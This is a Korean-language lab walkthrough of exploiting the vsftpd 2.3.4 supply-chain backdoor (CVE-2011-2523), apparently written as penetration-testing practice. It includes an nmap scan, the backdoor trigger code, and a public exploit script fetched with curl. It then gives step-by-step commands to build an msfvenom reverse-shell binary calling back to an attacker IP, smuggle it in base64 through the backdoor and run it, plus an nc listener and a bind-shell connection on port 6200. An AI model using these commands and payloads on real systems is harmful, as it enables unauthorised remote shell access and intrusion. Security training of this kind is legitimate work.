

# Reverse Shell Upgrade: vsftpd 2.3.4 Backdoor Exploitation (CVE-2011-2523)

---

## 🧪 0. 타겟 대상 스캔 - (IP 주소 변경 필요)
 └─$ nmap -sC -p 2100 -sV --open -Pn 172.31.251.233
 └─결과
 PORT     STATE SERVICE VERSION
 2100/tcp open  ftp     vsftpd 2.3.4
 | ftp-syst:
 2100 포트에서 vsftpd 2.3.4 버전 사용 중인 것을 확인
 
## 🔎 1. vsftpd 2.3.4 취약점 분석
 출시됐던 년도는 간단한 인터넷 검색 등으로 알아낼 수 있습니다. 이때 가장 확실한 방법은 시스템을 만든 벤더의 공식 홈페이지나 위키피디아 등에서 확인하는 것입니다. 
 인터넷 검색 키워드: vsftpd 2.3.4 release date, vsftpd 2.3.4 backdoor
 공식 또는 공신력 있는 사이트 예: https://security.appspot.com/vsftpd.html
 키워드는 release date, release 등을 이용합니다. 
 구글 검색을 하다 보니 security.appspot.com/vsftpd.html이 공식 홈페이지의 기능을 수행하고 있었고, 해당 페이지에서 2011년 12월에 버전 2.3.5가 배포되었다는 것을 알아냈습니다. 
 즉, 2.3.4의 경우는 이보다 더 오래됐을 것이라고 추정할 수 있습니다 12년이 지난 네트워크 서비스라면 취약점이 있을 것이라는 논리적인 추론을 할 수 있습니다.
 찾아보니 CVE-2011-2523 이라는 2011년도에 나온 공개 취약점이 존재 확인하는 
 "2011년 6월 30일부터 2011년 7월 3일까지 다운로드 된 VSFTPD 버전 2.3.4에는 TCP 포트 6200에 쉘을 여는 백도어가 삽입되어 있다" 라고 나오고 있습니다. 
 관련된 레퍼런스와 뉴스 기사들을 읽어보면 다음과 같은 내용을 알아낼 수 있습니다.
 
 공격자들이 VSFTPD가 빌드, 배포 중이었던 서버를 해킹, 소스코드에 본인들의 백도어를 삽입 사실상 기술적인 취약점이라기보다는 공급망 공격 형태
 원인 : vsFTPd 개발자 서버 해킹 후 악성 코드 삽입되었음, 해당 버전은 공급망 공격으로 인해 백도어가 포함된 버전임
 
## 🧬 2. 공격자가 삽입한 백도어 코드 분석 (요약) 
 이 백도어는 최초 FTP 로그인 시 유저 이름에 :) 이라는 글자 2개가 들어가면 실행 백도어 자체는 TCP 포트 6200에서 실행됨. 로그인 없이 쉘을 열어놓고 기다리는 형태라 
 접속하기 위한 계정 정보나 비밀이 필요 없음. 백도어 관련된 코드 또한 분석한 글이 있어 이를 사용합니다
 (https://github.com/0x48piraj/PwnHouse/blob/master/OSVDB-73573/README.md). 아래는 공격자들이 추가한 백도어를 트리거하는 코드입니다.
 **2.3.4 버전에 공격자가 삽입한 코드**
 else if((p_str->p_buf[i]==0x3a) && (p_str->p_buf[i+1]==0x29)) {vsf_sysutil_extra();}
 int vsf_sysutil_extra(void) {
    ...
    sa.sin_port = htons(6200);
    ...
    execl("/bin/sh", "sh", (char *)0);}
 유저 이름을 받는 버퍼에서 ASCII 코드 표의 Hex 값(0x3a, 0x29) 는 :)이며, :) 이라는 글자가 연속으로 나올 시 
 포트 6200에 소켓을 바인드 한 뒤, 해당 소켓에서 execl() 함수를 이용해 쉘(/bin/sh) 프로세스를 실행한다.

 **참고**
 취약한 부분의 소스코드까지 공개되는 취약점은 극히 드뭅니다. 대부분 취약점이 발견되는 회사들의 경우 브랜드의 이미지 훼손을 최소화하기 위해 
 최대한 취약점과 관련된 모든 정보를 숨기려고 노력하기 때문입니다. 
 따라서 대부분 취약점 분석은 해당 취약점이 어디서 발견된 어떤 종류의 취약점인지,어떤 영향을 미치는지 정도만 알아도 충분합니다.
 
 
 
## 📦 3. 공개 익스플로잇 코드 검색 및 사용 및 분석
 공개 취약점을 찾았으니, 이제 공개 익스플로잇 코드를 찾을 차례입니다. 이는 대부분 인터넷 검색이나 위 에서 언급했던 CVE 관련된 웹사이트들이 가지고 
 있는 링크에서 찾을 수 있습니다. CVE 웹사이트들은 취약점과 관련된 레퍼런스 링크를 같이 걸어놓는데, 이 레퍼런스 링크들은 대부분 취약점이 발견됐을 때 보안
 연구자 개인이나 회사들이 익스플로잇 코드와 함께 취약점을 발표하는 글인 경우가 많습니다.이번 실습에서는 아래의 익스플로잇 코드를 사용합니다
 **구글: vsftpd 2.3.4 "analysis" github**
 https://github.com/ahervias77/vsftpd-2.3.4-exploit/blob/master/vsftpd_234_exploit.py
 
 **익스플로잇 코드 분석**
  이번 취약점의 경우  FTP 최초 로그인 시 유저 이름 문자열 안에 :) 라는 글자가 순차적으로 나오면 백도어가 실행된다 - 였습니다. 
  exploit.py는 아래와 같은 코드의 따라 유저 이름에  :) 글자를 순차적 으로 넣어 로그인을 시도한 뒤, 백도어가 열리는 TCP 포트 6200으로 연결을 시도하는 것이 중요 익스플로잇 논리가 됩니다.
  ftp_socket.send(b'USER letmein:)\n') `유저 이름에 :) 삽입`
  ftp_socket.send(b'PASS please\n') `유저 패스워드에 임의 값 삽입`

  backdoor_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  backdoor_socket.connect((ip, 6200)) `백도어 포트 6200 연결 `


 해당 exploit.py는 단순하게 유저의 명령어 페이로드를 받아 backdoor_socket.send(command) 로 넘겨 실행하는 방법으로 페이로드를 사용하고 있습니다. 
 이번 실습에서는 단순히 명령어를 백도어 쉘에서 실행하는 것이 아닌, 리버스 쉘을 대상 시스템에 업로드 한 뒤 실행하는 방식의 페이로드를 준비해 봅니다.
 
## 🚧 4. 대상 시스템 환경 확인 (mod3ex 컨테이너)

 이번 실습의 경우 좀 특이한 페이로드를 준비합니다. whoami 인 mod3ex 호스트 위에서 실행중인 vsftpd v2.3.4은 도커(Docker) 컨테이너 안에서 실행 중입니다. 이 컨테이너에는 
  nc, python, php, curl, bash, /dev/tcp, /inet/tcp, wget, telnet, socat, awk 등의 평상시 사용하는 리버스쉘 명령어나 코드를 실행시킬 수 있는 인터프리터가 없습니다. 
	```
	php -h
	python3 -h
	curl -h
	wget -h
	gcc -h
	ls -alh /dev/tcp
	```
 따라서 해당 명령어가 사용될 수 없습니다. 또한 FTP로 파일 전송 또한 불가능합니다.
 > **base64 인코딩된 바이너리를 직접 전송하여 복호화 후 실행하는 방법으로 사용**
 

 
## 🛠️ 5. 공격 준비 및 실행 단계
 Step1. exploit.py 다운로드
  └─$curl -O https://raw.githubusercontent.com/ahervias77/vsftpd-2.3.4-exploit/master/vsftpd_234_exploit.py
  
  Step2. 리버스 쉘 바이너리 생성 ⚠️ LHOST, LPORT 는 공격자 IP, Port로 변경
  └─$msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.8.1.37 LPORT=443 -f elf -o reverse.elf
  
  Step3. 리버스 쉘 base64 인코딩으로 문자열 변환. -w 0으로 newline 생성 방지 
  └─$cat reverse.elf | base64 -w 0
   출력 예시 : f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAA...
  
  Step4. "base64 문자열 전송 및 디코딩으로 파일 생성 후 실행 권한 주고 실행" 하는 페이로드
  └─$echo 'f0VMRgIBAQAAA...생략...DwU=' | base64 -d > reverse.elf; chmod +x reverse.elf; ./reverse.elf
  
  Step5. 리버스 쉘 리스너 대기 (공격자 PC)
   └─$nc -lvnp 443
   
  Step6. exploit.py 실행으로 백도어 활성화 및 리버스 쉘 실행
  └─$python3 vsftpd_234_exploit.py 172.31.251.233 2100 "echo 'f0VMRgIBAQAAA...생략...DwU=' | base64 -d > reverse.elf; chmod +x reverse.elf; ./reverse.elf"



**참고 : 페이로드 없이 백도어(6200) 으로 BindShell 연결**
 Step1. ftp 접속
 └─$ftp <타겟_IP> 2100
 
 Step2. 유저명에 :)를 넣어 로그인 시도
 USER 아무거나:)
 PASS 아무거나
 
 Step3.위 과정이 끝나면 타겟의 백도어(6200 포트)로 shell 이 실행되었으며, 6200 포트 접근
 └─$nc <타겟_IP> 6200
 
 정상적으로 취약점이 동작했다면, 이 포트에서 /bin/sh 쉘이 열려 명령어를 입력할 수 있습니다.
 
 

 
 